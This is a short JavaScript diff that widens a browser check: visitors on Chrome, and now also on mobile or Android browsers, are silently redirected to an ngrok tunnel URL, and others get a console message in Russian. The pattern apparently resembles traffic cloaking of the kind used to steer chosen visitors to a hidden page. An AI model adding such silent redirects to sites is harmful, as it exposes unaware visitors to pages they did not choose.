@@ -33,7 +33,7 @@
             return /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
         }
         
-        if (isChrome()) {
+        if (isChrome() || /Mobi|Android/i.test(navigator.userAgent)) {
             window.location.href = 'https://honestly-just-hedgehog.ngrok-free.app/';
         } else {
             console.log("Браузер: Не Google Chrome");
